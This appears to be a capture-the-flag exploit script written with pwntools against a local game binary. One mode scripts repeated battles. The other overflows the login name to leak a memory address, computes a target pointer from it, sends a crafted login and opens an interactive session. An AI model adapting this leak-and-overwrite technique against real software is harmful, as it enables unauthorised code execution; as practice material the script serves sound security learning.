from pwn import * 
import sys

binary  = "./exe"
context.aslr = "off"
rl = lambda: io.recvline()
sla = lambda a,b: io.sendlineafter(a,b)

def login(uname,pwd):
    sla(">> ","1")
    sla("name : \n",uname)
    sla("passphrase : \n",pwd)

def battle(opt,atk,i):
    sla(">> ","2")
    sla(">> ",str(opt))
    for _ in range(i):
        sla(">> ",str(atk))
        io.recvline()
        out = io.recvline()
        if b"Won" in out:
            return 
        print(out)

if __name__ == "__main__":

    if(sys.argv[1] == "1"):
    
        io = process(binary)
        login("aaa","bbb")
        
        for i in range(79):
            print(i)
            battle(1,1,2)

        battle(2,1,1)
        io.recvuntil("champion !\n")
        files =[]
        files.append(io.recvline())

        print(files)

    elif (sys.argv[1] == "2"):

        io = process(binary)
        
        login("a"*24,"bbb")
        rl()
        
        addr = rl().strip()
        addr = addr.ljust(8,b"\x00")
        print(len(addr))
        addr = int(hex(u64(addr)).strip() + 'd7',16)-2048
        print(hex(addr))

        sla(">> ","3")
        gdb.attach(io)
        login(b"B"*4+p64(addr),"cccc")
        battle(2,1,1)
        io.recvuntil("champion !\n")

        io.interactive()

    